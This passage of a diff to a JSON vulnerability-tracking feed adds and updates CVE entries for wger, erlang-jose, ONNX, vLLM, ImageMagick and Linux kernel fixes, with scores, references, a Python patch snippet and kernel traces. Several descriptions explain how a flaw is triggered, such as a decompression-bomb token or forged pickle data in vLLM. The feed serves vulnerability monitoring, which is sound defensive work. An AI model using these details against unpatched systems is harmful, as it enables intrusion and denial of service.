Chain:** Since `get_permission_list()` always includes `'trainer'` in assignable roles, any manager can unknowingly create the account that will later lock them out.\n\n\n### Fix\n\nAdd a privilege hierarchy check in `UserDeactivateView.dispatch()` and `UserActivateView.dispatch()`:\n\n```python\n# File: wger/core/views/user.py, inside dispatch() of both views\n\nedit_user = get_object_or_404(User, pk=self.kwargs['pk'])\n\n# Trainers must not deactivate/activate managers or other trainers\nif request.user.has_perm('gym.gym_trainer') and not (\n    request.user.has_perm('gym.manage_gym')\n    or request.user.has_perm('gym.manage_gyms')\n):\n    if (\n        edit_user.has_perm('gym.manage_gym')\n        or edit_user.has_perm('gym.manage_gyms')\n        or edit_user.has_perm('gym.gym_trainer')\n    ):\n        return HttpResponseForbidden()\n```",
+      "published": "2026-10-07T13:59:14Z",
+      "updated": "2026-10-26T15:48:39Z",
+      "cvss": 7.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:wger"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-x249-cx55-2h87",
+        "https://github.com/wger-project/wger/security/advisories/GHSA-x249-cx55-2h87",
+        "https://github.com/wger-project/wger/releases/tag/2.6",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-46434",
+        "https://github.com/wger-project/wger/commit/9be2d5f2b4559f9a9d5b3f3b3cdadcfef449f645",
+        "https://github.com/pypa/advisory-database/tree/main/vulns/wger/PYSEC-2026-4316.yaml"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00221,
+      "epss_percentile": 0.12525,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "django"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 28.2,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 14.2,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-65627",
+      "aliases": [],
+      "title": "Decompression bomb via unbounded zlib:inflate in jose_jwe_zip:uncompress/2",
+      "description": "Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in potatosalad jose (erlang-jose) allows a remote attacker to exhaust a node's memory with a small crafted JWE token.\n\nThe jose_jwe_zip:uncompress/2 function in src/jwe/jose_jwe_zip.erl decompresses the DEFLATE-compressed plaintext of a JWE that carries the optional zip: DEF header by calling zlib:inflate/2 on the entire attacker-controlled stream, with no bound on the output size or the inflation ratio. Raw DEFLATE reaches ratios around 1000:1 on highly repetitive input, so a few-kilobyte token inflates to hundreds of megabytes or gigabytes in a single call.\n\nDecompression runs automatically during decryption through jose_jwe:block_decrypt/2 (JOSE.JWE.block_decrypt/2 in Elixir), before the recipient can inspect or reject the payload. With the common asymmetric key-management algorithms (RSA-OAEP, ECDH-ES) an attacker needs only the recipient's public key to craft such a token, so no authentication or secret material is required. A single small token can exhaust the node's memory and crash the BEAM, denying service to all users.\n\nThis issue affects jose: from 1.0.0 before 1.11.13.",
+      "published": "2026-10-26T19:53:16.336Z",
+      "updated": "2026-10-26T19:53:16.336Z",
+      "cvss": 6.9,
+      "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+      "severity": "medium",
+      "cpes": [
+        "potatosalad:jose"
+      ],
+      "packages": [],
+      "vendor_products": [
+        "potatosalad jose",
+        "jose",
+        "potatosalad/erlang-jose"
+      ],
+      "references": [
+        "https://github.com/potatosalad/erlang-jose/security/advisories/GHSA-wfpv-qxp8-x5gm",
+        "https://cna.erlef.org/cves/CVE-2026-65627.html",
+        "https://osv.dev/vulnerability/EEF-CVE-2026-65627",
+        "https://github.com/potatosalad/erlang-jose/commit/a7746ecd4950f85a393136e449a91dac62b5c429",
+        "https://github.com/potatosalad/erlang-jose/commit/857eb8e7f2d33e2c9ca2189e77226561cacaf2ad"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "zlib"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 27.8,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 13.8
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-106073",
       "aliases": [],
       "title": "",
@@ -14158,6 +16852,52 @@
         "popularity": 14.0,
         "cvss": 12.8,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-115919",
+      "aliases": [],
+      "title": "",
+      "description": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. Prior to 1.22.0, RNNShapeInference_opset1_to_6() processes malformed RNN and LSTM nodes from opsets 1 through 6 and GRU nodes from opsets 3 through 6 without verifying that the first input has rank three. The function accesses dim(0) and dim(1) on an undersized protobuf shape, which can read outside the intended repeated field and terminate an application when onnx.shape_inference.infer_shapes() processes an untrusted model that can pass onnx.checker.check_model(). This issue is fixed in version 1.22.0.",
+      "published": "2026-10-26T18:17:39.607",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 6.2,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/onnx/onnx/commit/92e541266af5dd38cfa48aeb92206f4268a066cd",
+        "https://github.com/onnx/onnx/pull/7879",
+        "https://github.com/onnx/onnx/releases/tag/v1.22.0",
+        "https://github.com/onnx/onnx/security/advisories/GHSA-48m4-24cq-37qf"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "protobuf"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 26.4,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 12.4
       },
       "ai_analysis": ""
     },
@@ -14354,7 +17094,7 @@
       "title": "",
       "description": "ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a policy bypass in the PS, PDF and XPS decoders that allows the security policy's list length limit on scene selection to be circumvented. Attackers supplying a specific argument can cause ImageMagick to process more scenes than permitted, potentially exhausting resources.",
       "published": "2026-10-25T14:16:52.257",
-      "updated": "2026-10-26T13:49:46.657",
+      "updated": "2026-10-26T17:17:21.517",
       "cvss": 4.8,
       "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -14625,7 +17365,7 @@
       "title": "",
       "description": "ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the handling of the -cdl (color decision list) option, where allocated memory is not cleaned up after use. Attackers can supply input that causes the -cdl option to be processed, repeatedly leaking memory and degrading availability through resource exhaustion.",
       "published": "2026-10-25T14:16:54.557",
-      "updated": "2026-10-26T13:49:46.657",
+      "updated": "2026-10-26T17:17:22.090",
       "cvss": 4.8,
       "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -14755,6 +17495,52 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-115912",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. Prior to 0.32.0, an authenticated caller can place forged shared-memory address and monotonic_id values in public multimodal features.kwargs_data. In scale-out deployments with shared-memory multimodal caching enabled, workers trust those values and pass attacker-selected bytes to pickle.loads(), allowing arbitrary Python execution even when insecure serialization is disabled. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T17:17:18.910",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/3d5625cc3c2474994107047d7a6ecb8e4008f9b0",
+        "https://github.com/vllm-project/vllm/pull/59357",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-6757-hggm-hp2w"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 22.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 15.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-116181",
       "aliases": [],
       "title": "",
@@ -14805,7 +17591,7 @@
       "title": "",
       "description": "vLLM from 0.19.0 before 0.24.0 contains a decompression bomb vulnerability because the AudioMediaIO multimodal path calls load_audio without the max_duration_s decoded-duration limit. Authenticated attackers can send small compressed audio via input_audio or audio_url in /v1/chat/completions requests that expands to huge decoded PCM, exhausting server memory.",
       "published": "2026-10-25T14:16:57.017",
-      "updated": "2026-10-26T14:03:56.640",
+      "updated": "2026-10-26T17:17:22.620",
       "cvss": 7.1,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
@@ -22719,24 +25505,22 @@
     {
       "id": "CVE-2026-99088",
       "aliases": [],
-      "title": "net: openvswitch: validate transport header presence in set_ipv6_addr",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nnet: openvswitch: validate transport header presence in set_ipv6_addr\n\nWhen executing IPv6 address rewrite actions on IPv6 fragments,\nset_ipv6_addr() calls update_ipv6_checksum(). If parse_ipv6hdr()\nprocesses a non-first IPv6 fragment, it sets key->ip.proto to\nNEXTHDR_FRAGMENT and returns early without calling\nskb_set_transport_header().\n\nupdate_ipv6_checksum() unconditionally evaluates skb_transport_offset()\non entry before checking l4_proto.  Because skb->transport_header is\nuninitialized, this triggers a warning under CONFIG_DEBUG_NET=y although\nit is completely harmless.\n\nFix this by returning early in update_ipv6_checksum() if l4_proto is\nNEXTHDR_FRAGMENT. This avoids reading the uninitialized transport offset\nfor fragments while preserving the debug warning for any other protocol\nwhere the transport header is unexpectedly missing.\n\nSee the syzbot trace:\n\n!skb_transport_header_was_set(skb)\nWARNING: ./include/linux/skbuff.h:3075 at skb_transport_header include/linux/skbuff.h:3075 [inline], CPU#1: syz-executor463/5635\nWARNING: ./include/linux/skbuff.h:3075 at skb_transport_offset include/linux/skbuff.h:3250 [inline], CPU#1: syz-executor463/5635\nWARNING: ./include/linux/skbuff.h:3075 at update_ipv6_checksum net/openvswitch/actions.c:361 [inline], CPU#1: syz-executor463/5635\nWARNING: ./include/linux/skbuff.h:3075 at set_ipv6_addr+0x462/0x660 net/openvswitch/actions.c:399, CPU#1: syz-executor463/5635\n[...]\nRIP: 0010:skb_transport_header include/linux/skbuff.h:3075 [inline]\nRIP: 0010:skb_transport_offset include/linux/skbuff.h:3250 [inline]\nRIP: 0010:update_ipv6_checksum net/openvswitch/actions.c:361 [inline]\nRIP: 0010:set_ipv6_addr+0x462/0x660 net/openvswitch/actions.c:399\n[...]\nCall Trace:\n <TASK>\n set_ipv6 net/openvswitch/actions.c:531 [inline]\n do_execute_actions+0x557e/0x8600 net/openvswitch/actions.c:1366\n ovs_execute_actions+0xde/0x520 net/openvswitch/actions.c:1592\n ovs_packet_cmd_execute+0xb4f/0xf10 net/openvswitch/datapath.c:705\n genl_family_rcv_msg_doit+0x233/0x340 net/netlink/genetlink.c:1114\n genl_rcv_msg+0x614/0x7a0 net/netlink/genetlink.c:1209\n netlink_rcv_skb+0x226/0x4a0 net/netlink/af_netlink.c:2572\n genl_rcv+0x28/0x40 net/netlink/genetlink.c:1218\n netlink_unicast+0x7bd/0x940 net/netlink/af_netlink.c:1361\n netlink_sendmsg+0x813/0xb40 net/netlink/af_netlink.c:1916\n sock_sendmsg_nosec+0x14e/0x190 net/socket.c:800",
-      "published": "2026-10-26T14:51:58.460Z",
+      "published": "2026-10-26T15:16:47.517",
       "updated": "2026-10-26T15:16:47.517",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://git.kernel.org/stable/c/b7b80d204abdc258006f9e17c92b363ab13bb599",
-        "https://git.kernel.org/stable/c/6774af7cd17be8f0d0f70de3a749d381b4f2e9da",
         "https://git.kernel.org/stable/c/2594795fd832f0253826d64ff8976b8ff5fbfe9f",
+        "https://git.kernel.org/stable/c/3c6a4b11330fe424557538a98fca9f0a4c5bf313",
+        "https://git.kernel.org/stable/c/6774af7cd17be8f0d0f70de3a749d381b4f2e9da",
         "https://git.kernel.org/stable/c/6b8897ba0733f88f0360ea48a970f373f9142de0",
-        "https://git.kernel.org/stable/c/3c6a4b11330fe424557538a98fca9f0a4c5bf313"
+        "https://git.kernel.org/stable/c/b7b80d204abdc258006f9e17c92b363ab13bb599"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -22747,7 +25531,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -22768,24 +25551,22 @@
     {
       "id": "CVE-2026-99089",
       "aliases": [],
-      "title": "ASoC: samsung: i2s: enable op_clk in probe to balance runtime PM",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nASoC: samsung: i2s: enable op_clk in probe to balance runtime PM\n\nThe probe function puts the device into the runtime PM active state with\nonly the \"iis\" bus clock enabled, but it also sets priv->op_clk to the\nparent of the RCLK_SRC mux without enabling it. The runtime PM suspend\ncallback disables both clocks, so the first runtime suspend after probe\ndisables op_clk once more than it was enabled.\n\nOn Exynos5250 Arndale both clocks resolve to the same EXYNOS_I2S_BUS gate,\nso this triggers the following warning during boot:\n\n WARNING: drivers/clk/clk.c:1270 at clk_core_disable+0xe4/0x23c, CPU#0: kworker/u8:3/45\n i2s_bus already disabled\n ...\n Workqueue: pm pm_runtime_work\n Call trace:\n  ...\n  clk_core_disable from clk_disable+0x28/0x34\n  clk_disable from i2s_runtime_suspend+0x58/0x68 [snd_soc_i2s]\n  i2s_runtime_suspend [snd_soc_i2s] from genpd_runtime_suspend+0xc4/0x298\n  genpd_runtime_suspend from __rpm_callback+0x48/0x18c\n  __rpm_callback from rpm_callback+0x4c/0x50\n  rpm_callback from rpm_suspend+0xf4/0x718\n  rpm_suspend from pm_runtime_work+0x9c/0xa0\n  ...\n\nFix this by enabling op_clk in probe right after getting it, so the clock\nstate matches the runtime PM active state, and by disabling it in remove.",
-      "published": "2026-10-26T14:51:59.055Z",
+      "published": "2026-10-26T15:16:47.673",
       "updated": "2026-10-26T15:16:47.673",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
         "https://git.kernel.org/stable/c/2c64c30d493d82d5edc95811cede0083e1195822",
         "https://git.kernel.org/stable/c/5dac6bf09b5a4fff2433629801309c3884c3e94a",
         "https://git.kernel.org/stable/c/64bb35079dcbc67901da1fe8c52c234cbcd17df3",
-        "https://git.kernel.org/stable/c/a728c12f8bd89947894e227d0f4f83a895ac9ab7",
-        "https://git.kernel.org/stable/c/7529254014764ae0b8c33d5c61a58f36c65b1a1c"
+        "https://git.kernel.org/stable/c/7529254014764ae0b8c33d5c61a58f36c65b1a1c",
+        "https://git.kernel.org/stable/c/a728c12f8bd89947894e227d0f4f83a895ac9ab7"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -22796,7 +25577,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -22817,24 +25597,22 @@
     {
       "id": "CVE-2026-99090",
       "aliases": [],
-      "title": "drm/amdgpu: serialize vblank counter reads against GPU reset",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\ndrm/amdgpu: serialize vblank counter reads against GPU reset\n\nThe vblank counter callback reads display registers and scanout\nposition without holding reset_domain->sem. During GPU recovery,\ndisplay commit work can call the callback while reset owns the\nsemaphore for writing. The hardware access then triggers the\nlockdep_assert_held() in amdgpu_device_skip_hw_access() and sets\nTAINT_WARN when lockdep is enabled.\n\nTry to acquire the reset semaphore for reading before accessing the\nhardware, and hold it across the counter and scanout-position reads.\nIf reset is already in progress, return DRM's cached software vblank\ncount instead. This avoids blocking behind reset and avoids accessing\ndisplay hardware while it is being reset.\n\nThe cached count is less accurate than the hardware count, but is\nused only when reset prevents a safe hardware read. This addresses\nthe reset-time warning from this vblank path; it does not suppress or\nfix unrelated lockdep warnings.\n\n(cherry picked from commit 51a4359f7431a4be5e42803c8bdaf7e0e5be2934)",
-      "published": "2026-10-26T14:51:59.654Z",
+      "published": "2026-10-26T15:16:47.817",
       "updated": "2026-10-26T15:16:47.817",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
         "https://git.kernel.org/stable/c/037796d9ca1da97978deaefd88ca5649f6cb69f5",
         "https://git.kernel.org/stable/c/11b6193c8841a052b7907006ffb1e02468b1448e",
+        "https://git.kernel.org/stable/c/1a6023edfbb5673f55fab6348f135fb3b1428ea5",
         "https://git.kernel.org/stable/c/8d6f773d7479034a574ecc3b585bcd07d46b4824",
-        "https://git.kernel.org/stable/c/f4a0a1ce147d1a6e428d7cb5e3b99fd695139fc7",
-        "https://git.kernel.org/stable/c/1a6023edfbb5673f55fab6348f135fb3b1428ea5"
+        "https://git.kernel.org/stable/c/f4a0a1ce147d1a6e428d7cb5e3b99fd695139fc7"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -22845,7 +25623,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -22866,24 +25643,22 @@
     {
       "id": "CVE-2026-99091",
       "aliases": [],
-      "title": "Bluetooth: MGMT: Fix status of pending commands flushed on power off",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nBluetooth: MGMT: Fix status of pending commands flushed on power off\n\ncmd_complete_rsp() receives a struct cmd_lookup and, for a pending\ncommand that has no cmd_complete callback, falls through to\ncmd_status_rsp(cmd, data). cmd_status_rsp() reads data as a u8 *, so\nthe status sent comes from the first byte of match->sk's\nrepresentation, not from match->mgmt_status.\n\ncommit f53e1c9c726d (\"Bluetooth: MGMT: Fix possible crash on\nmgmt_index_removed\") changed the callers' data from &status to &match\nand updated the cmd_complete branch to match->mgmt_status, but left\nthe fall-through passing data unchanged.\n\nIn mgmt_index_removed() match->sk is NULL, so every such command is\nanswered with status 0x00 (Success) instead of\nMGMT_STATUS_INVALID_INDEX. In __mgmt_power_off() it is NULL too,\nunless a Set Powered command was pending: then settings_rsp() has\nstored that command's socket in match->sk, and the byte sent comes\nfrom the socket pointer. Either way the status the caller set,\nMGMT_STATUS_NOT_POWERED (or MGMT_STATUS_INVALID_INDEX when the device\nis being unregistered), is lost.\n\nPass the status the callers set.\n\nThis was seen on a QCA9377 laptop: bluetoothd's Start Discovery,\npending when the adapter was powered off, was answered with Command\nStatus 0x00 and no parameters, and bluetoothd 5.72 crashed on the\nzero-length success. BlueZ master has since added the length check\non that path (\"adapter: Fix crash on short start discovery reply\",\nBlueZ a734b06059cb), but userspace should still be told Not Powered,\nnot Success.\n\nTested on Ubuntu 7.0.0-31 with a virtual controller (hci_vhci):\npower off is held in HCI Write Scan Enable while a Start Discovery is\nsubmitted, and the flush answers it with status 0x00 before this\nchange and 0x0f (Not Powered) after.",
-      "published": "2026-10-26T14:52:00.262Z",
+      "published": "2026-10-26T15:16:47.960",
       "updated": "2026-10-26T15:16:47.960",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
+        "https://git.kernel.org/stable/c/07976405a3c71253e50533ee7b7a8b0dc16ab6ba",
         "https://git.kernel.org/stable/c/44ce36c5789ac84e65de1e98c32db9a5ac04ed47",
         "https://git.kernel.org/stable/c/7ed7e038b520cf0dfa12d61c2caddb95e2f6922d",
-        "https://git.kernel.org/stable/c/ec227cddd13cd7ac9077d263a73473ac370a055d",
-        "https://git.kernel.org/stable/c/07976405a3c71253e50533ee7b7a8b0dc16ab6ba",
-        "https://git.kernel.org/stable/c/86ef0f58bdecdedb3a1240971c56d71b7e4ce3fc"
+        "https://git.kernel.org/stable/c/86ef0f58bdecdedb3a1240971c56d71b7e4ce3fc",
+        "https://git.kernel.org/stable/c/ec227cddd13cd7ac9077d263a73473ac370a055d"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -22894,7 +25669,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -22915,23 +25689,21 @@
     {
       "id": "CVE-2026-99092",
       "aliases": [],
-      "title": "riscv: patch: fix handling of bpf-jit execmem addresses",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nriscv: patch: fix handling of bpf-jit execmem addresses\n\nCommit 8718e5a3090b (\"riscv: patch: skip fixmap mapping when kernel text\nis already writable\") gated the core_kernel_text() branch of patch_map()\non CONFIG_STRICT_KERNEL_RWX, and explicitly left the vmalloc branch\nunchanged. That branch has a separate problem.\n\nThat branch only creates a temporary writable fixmap alias when\nCONFIG_STRICT_MODULE_RWX is enabled, and otherwise assumes the target is\ndirectly writable and returns the address unchanged. That assumption no\nlonger holds: bpf_prog_pack_alloc calls set_memory_rox() on every pack\nunconditionally in alloc_new_pack(), independently of any\nCONFIG_STRICT_*_RWX option, so BPF text in the vmalloc area is read-only\nregardless of what CONFIG_STRICT_MODULE_RWX says.\n\nWith CONFIG_STRICT_MODULE_RWX=n, patch_map() returns the read-only\naddress directly, the subsequent copy_to_kernel_nofault() takes a\npage fault and returns -EFAULT. bpf_arch_text_copy() turns that into\n-EINVAL, which propagates through bpf_jit_binary_pack_finalize() to the\nWARN_ON() in bpf_int_jit_compile() and leaves the program un-JITed.\n\nNote that BPF cannot be fixed the way kprobes was in\ncommit bdc46e507b59 (\"riscv: mm: make EXECMEM_KPROBES writable without\nCONFIG_STRICT_MODULE_RWX\"). EXECMEM_BPF is already PAGE_KERNEL, i.e.\nwritable at allocation time; the read-only mapping is established\nafterwards by generic code in alloc_new_pack(), which arch code cannot\ninfluence. The only place this can be handled is patch_map().\n\nThis is the same problem that was fixed on arm64 by commit b1480ed230ac\n(\"arm64: patching: fix handling of execmem addresses\"), and the fix is\nthe same: CONFIG_EXECMEM is what actually tracks whether the vmalloc\narea can hold executable memory that needs a temporary alias to be\nwritten. CONFIG_BPF_JIT, CONFIG_KPROBES and CONFIG_MODULES all select\nit.\n\nNote that this is not limited to CONFIG_MODULES=n. Unlike arm64, riscv\nselects CONFIG_ARCH_OPTIONAL_KERNEL_RWX, so CONFIG_STRICT_MODULE_RWX can\nbe disabled with CONFIG_MODULES=y as well, and the bug is reachable in\nthat configuration too.\n\nThe !CONFIG_MMU build is unaffected: it has its own __patch_insn_set()\nand __patch_insn_write() implementations and never calls patch_map().",
-      "published": "2026-10-26T14:52:00.860Z",
+      "published": "2026-10-26T15:16:48.110",
       "updated": "2026-10-26T15:16:48.110",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
         "https://git.kernel.org/stable/c/562a35b9e0b3d9483d9472995219cadb3592db3d",
         "https://git.kernel.org/stable/c/9e8fc7972b398e9dc2415ece283d8f64edac3858",
-        "https://git.kernel.org/stable/c/f71d6ea3843c8038c431c2699482f246aea37ca0",
-        "https://git.kernel.org/stable/c/a510e1ae8c9030750c2edf7b0bc9b186cd8c7a06"
+        "https://git.kernel.org/stable/c/a510e1ae8c9030750c2edf7b0bc9b186cd8c7a06",
+        "https://git.kernel.org/stable/c/f71d6ea3843c8038c431c2699482f246aea37ca0"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -22942,7 +25714,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -22963,22 +25734,20 @@
     {
       "id": "CVE-2026-99093",
       "aliases": [],
-      "title": "mm: don't schedule deferred kernel page table freeing while booting",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nmm: don't schedule deferred kernel page table freeing while booting\n\nBooting with a boot-time function tracer and a filter, for example\n\n  ftrace=function ftrace_filter=pud_free_pmd_page\n\npanics on 7.3-rc4 as soon as the tracer starts:\n\n  [   23.531178] Starting tracer 'function'\n  [   23.675800] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000038: 0000 [#1] SMP KASAN NOPTI\n  [   23.819917] KASAN: null-ptr-deref in range [0x00000000000001c0-0x00000000000001c7]\n  [   23.964025] CPU: 0 UID: 0 PID: 0 Comm: swapper Not tainted 7.3.0-rc4-fe2ec83746e5-with-fixes-v2+ #195 PREEMPT(undef)\n  [   24.252248] RIP: 0010:__queue_work+0xab/0xf00\n  [   25.981629] Call Trace:\n  [   26.125727]  <TASK>\n  [   26.413912]  ? pagetable_free_kernel+0x20/0x120\n  [   26.990283]  queue_work_on+0x97/0xf0\n  [   27.134382]  __cpa_collapse_large_pages+0x501/0x6f0\n  [   27.566662]  cpa_flush+0x394/0x620\n  [   27.998953]  change_page_attr_set_clr+0x321/0x4a0\n  [   29.151729]  set_memory_rox+0xa2/0xf0\n  [   29.584018]  create_trampoline+0x431/0x6f0\n  ...\n  [   44.343347] Kernel panic - not syncing: Attempted to kill the idle task!\n\nThe boot-time tracer is started from early_trace_init(), which runs\nbefore workqueue_init_early().  Making its trampoline read-only splits a\nlarge page, and CPA collapses it again right away.  The split table has\nbeen a kernel page table since commit 9e4a3ec3411b\n(\"x86/mm/pat: Allocate split page tables as kernel page tables\"), so the\ncollapse frees it through pagetable_free_kernel(), which queues work on\nsystem_percpu_wq - still NULL at that point.  That commit is correct in\nitself; it only lets CPA reach pagetable_free_kernel() before the\nworkqueue that function relies on exists.\n\nKeep putting the table on the list, but don't schedule the work while\nthe system is still booting.  A core_initcall schedules it once to free\nwhatever was queued by then.",
-      "published": "2026-10-26T14:52:01.450Z",
+      "published": "2026-10-26T15:16:48.253",
       "updated": "2026-10-26T15:16:48.253",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
+        "https://git.kernel.org/stable/c/2fb552b0bee70c24c092720028ab4620f5eb2646",
         "https://git.kernel.org/stable/c/7a25ca170c12a9328f6fcf4410713beb516b01c0",
-        "https://git.kernel.org/stable/c/df6c704a08bc0925d5db047b0a6221f962bda4d9",
-        "https://git.kernel.org/stable/c/2fb552b0bee70c24c092720028ab4620f5eb2646"
+        "https://git.kernel.org/stable/c/df6c704a08bc0925d5db047b0a6221f962bda4d9"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -22989,7 +25758,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -23010,22 +25778,20 @@
     {
       "id": "CVE-2026-99094",
       "aliases": [],
-      "title": "Bluetooth: btintel_pcie: fix TX descriptor bounds check",
+      "title": "",
